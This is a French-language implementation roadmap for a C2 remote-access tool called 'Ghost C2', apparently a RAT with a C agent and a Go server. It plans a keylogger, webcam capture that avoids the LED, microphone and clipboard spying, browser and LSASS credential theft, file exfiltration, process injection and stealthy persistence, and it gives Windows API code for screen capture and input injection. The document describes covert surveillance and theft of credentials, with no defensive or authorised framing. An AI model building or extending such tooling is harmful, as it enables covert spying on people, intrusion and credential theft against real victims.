# Ghost C2 - TODO Implementation

## État actuel vs Objectifs

### ✅ Déjà implémenté

| Module | Agent (C) | Server (Go) |
|--------|-----------|-------------|
| Core | ✅ demon.c, config.c | ✅ main.go |
| Crypto | ✅ aes.c, xor.c, base64.c | ✅ aes.go |
| Network | ✅ transport.c, profile.c | ✅ http.go, manager.go |
| Sessions | - | ✅ agent.go, manager.go |
| Tasks | ✅ shell, file, process, recon, token, persist | ✅ queue.go |
| Evasion | ✅ antidebug.c, sandbox.c, sleep.c, syscalls.c | - |
| API | - | ✅ router.go |
| CLI | - | ✅ console.go |

---

## 🔴 À implémenter - Priorité Haute

### 1. Keylogger
- [ ] Hook clavier (SetWindowsHookEx ou GetAsyncKeyState)
- [ ] Capture fenêtre active
- [ ] Buffer et envoi périodique au C2
- [ ] Chiffrement des logs

### 2. Screenshot
- [ ] Capture écran complet (BitBlt)
- [ ] Capture fenêtre spécifique
- [ ] Compression (JPEG/PNG)
- [ ] Envoi chunked au C2

### 3. Webcam (sans LED si possible)
- [ ] Capture via DirectShow/Media Foundation
- [ ] Désactivation LED (driver-level, complexe)
- [ ] Stream ou snapshot
- [ ] Compression vidéo

> ⚠️ **Note sur le LED**: La plupart des webcams ont le LED câblé en hardware.
> Désactiver le LED nécessite un driver custom ou exploitation firmware.
> Certaines webcams low-cost ont le LED en software (contrôlable).

### 4. Remote Desktop (VNC-like)
- [ ] Capture écran continue
- [ ] Envoi des frames (différentiel pour économiser bande passante)
- [ ] Réception des inputs (souris, clavier)
- [ ] Injection des inputs (SendInput API)
- [ ] Compression + chiffrement

### 5. Microphone
- [ ] Capture audio (WASAPI)
- [ ] Compression audio
- [ ] Stream ou enregistrement

---

## 🟠 À implémenter - Priorité Moyenne

### 6. Authentification Agent
- [ ] Build Key unique par compilation
- [ ] Agent ID généré au premier lancement
- [ ] Challenge-Response (HMAC)
- [ ] Validation côté serveur
- [ ] Kill switch (révocation)

### 7. Clipboard Monitor
- [ ] Surveillance continue du presse-papier
- [ ] Capture texte et images
- [ ] Détection mots de passe copiés

### 8. Browser Credentials
- [ ] Chrome passwords (SQLite + DPAPI)
- [ ] Firefox passwords (NSS)
- [ ] Chrome cookies
- [ ] Historique de navigation

### 9. Credential Dumping
- [ ] LSASS dump (MiniDumpWriteDump)
- [ ] SAM/SYSTEM extraction
- [ ] Registry credentials (autologon, VNC, PuTTY)

### 10. File Exfiltration
- [ ] Recherche par extension (.docx, .pdf, .kdbx)
- [ ] Recherche par mot-clé (password, secret)
- [ ] Envoi chunked
- [ ] Compression avant envoi

---

## 🟡 À implémenter - Priorité Basse

### 11. SOCKS Proxy
- [ ] SOCKS5 server côté opérateur
- [ ] Tunnel via agent
- [ ] Accès au réseau interne

### 12. Port Forward
- [ ] Forward local → distant
- [ ] Forward distant → local

### 13. Scan Vulnérabilités
- [ ] Check SeImpersonatePrivilege
- [ ] Check unquoted service paths
- [ ] Check AlwaysInstallElevated
- [ ] Check credentials en clair
- [ ] Rapport automatique au dashboard

### 14. Injection Avancée
- [ ] Process Hollowing
- [ ] APC Injection
- [ ] Reflective DLL loading

### 15. Persistence Avancée
- [ ] COM Hijacking
- [ ] WMI Event Subscription
- [ ] Scheduled Task via COM API

---

## 📋 Détails techniques

### Remote Desktop - Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    REMOTE DESKTOP                            │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  AGENT                              SERVEUR                  │
│  ─────                              ───────                  │
│  1. Capture écran (30 fps)          1. Reçoit frames        │
│  2. Compare avec frame précédente   2. Décode              │
│  3. Encode diff (RLE ou JPEG)       3. Affiche             │
│  4. Chiffre + envoie                                        │
│                                                              │
│  5. Reçoit events input             4. Capture mouse/kb    │
│  6. SendInput() pour injecter       5. Envoie events       │
│                                                              │
│  Optimisations:                                             │
│  - Diviser écran en tiles (16x16)                          │
│  - N'envoyer que les tiles modifiées                       │
│  - Compression JPEG qualité variable                        │
│  - WebSocket pour latence faible                            │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Webcam - Approches pour le LED

```
┌─────────────────────────────────────────────────────────────┐
│              WEBCAM SANS LED                                 │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  MÉTHODE 1: Software-controlled LED (rare)                  │
│  - Certaines webcams permettent de contrôler le LED         │
│  - Vendor-specific API                                      │
│                                                              │
│  MÉTHODE 2: Driver hook                                     │
│  - Intercepter les appels au driver                         │
│  - Bloquer l'activation du LED                              │
│  - Nécessite kernel access                                  │
│                                                              │
│  MÉTHODE 3: Firmware modification                           │
│  - Modifier le firmware de la webcam                        │
│  - Très complexe, risqué                                    │
│                                                              │
│  RÉALITÉ:                                                   │
│  - La plupart des webcams = LED câblé en hardware          │
│  - Impossible à désactiver sans modification physique       │
│  - Focus sur discrétion (capture rapide, pas de preview)   │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Screenshot - APIs Windows

```c
// Capture écran
HDC hdcScreen = GetDC(NULL);
HDC hdcMem = CreateCompatibleDC(hdcScreen);
HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
SelectObject(hdcMem, hBitmap);
BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

// Pour le remote desktop: utiliser DXGI pour de meilleures perfs
// IDXGIOutputDuplication (Windows 8+)
```

### Input Injection - Remote Control

```c
// Injecter mouvement souris
INPUT input = {0};
input.type = INPUT_MOUSE;
input.mi.dx = x * (65535 / screen_width);
input.mi.dy = y * (65535 / screen_height);
input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
SendInput(1, &input, sizeof(INPUT));

// Injecter click
input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
SendInput(1, &input, sizeof(INPUT));
input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
SendInput(1, &input, sizeof(INPUT));

// Injecter touche clavier
input.type = INPUT_KEYBOARD;
input.ki.wVk = VK_RETURN;
SendInput(1, &input, sizeof(INPUT));
```

---

## 🎯 Ordre d'implémentation suggéré

### Phase 1 - Surveillance
1. Screenshot ← Simple, très utile
2. Keylogger ← Capture credentials
3. Clipboard ← Passwords copiés

### Phase 2 - Remote Access  
4. Remote Desktop ← Contrôle total
5. Webcam ← Surveillance
6. Microphone ← Audio

### Phase 3 - Credentials
7. Browser credentials ← Chrome/Firefox
8. LSASS dump ← Hashes
9. File search ← Documents

### Phase 4 - Infrastructure
10. Auth agent ← Sécurité
11. SOCKS proxy ← Tunneling
12. Scan vulnérabilités ← Automatisation

---

## 📁 Fichiers à créer

### Agent (C)
```
agent/src/
├── surveillance/
│   ├── keylogger.c
│   ├── screenshot.c
│   ├── clipboard.c
│   ├── webcam.c
│   └── microphone.c
├── remote/
│   ├── desktop.c      (capture + input)
│   └── socks.c        (proxy)
├── credentials/
│   ├── browser.c
│   ├── lsass.c
│   └── registry.c
└── recon/
    └── vulnscan.c
```

### Server (Go)
```
server/internal/
├── auth/
│   └── validator.go    (agent auth)
├── handlers/
│   ├── keylog.go
│   ├── screenshot.go
│   ├── remote.go       (desktop)
│   └── credentials.go
└── proxy/
    └── socks.go
```

### Web UI (React)
```
web/src/pages/
├── RemoteDesktop.jsx   (viewer + controls)
├── Keylogger.jsx       (logs viewer)
├── Screenshots.jsx     (gallery)
└── Credentials.jsx     (table)
```
